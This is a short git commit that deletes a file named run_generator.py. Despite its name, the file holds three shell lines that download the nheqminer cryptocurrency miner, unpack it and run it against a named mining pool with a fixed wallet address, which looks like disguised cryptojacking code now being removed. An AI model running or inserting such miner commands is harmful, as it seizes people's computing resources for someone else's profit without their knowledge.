2320f4e5d01ccb65cec51d12102daed19c34a6c4
cleancoindev <31389482+cleancoindev@users.noreply.github.com>
2022-12-28 19:21:27 -1000

    Delete run_generator.py

--- run_generator.py
+++
@@ -1,3 +0,0 @@
-wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz 
-tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz 
-nheqminer/nheqminer -v -l ap.luckpool.net:3956 -u RNP9gsoRceBPvXUc8wKF5uNh1PKKuMUXTL.Rig001 -p x -t 6
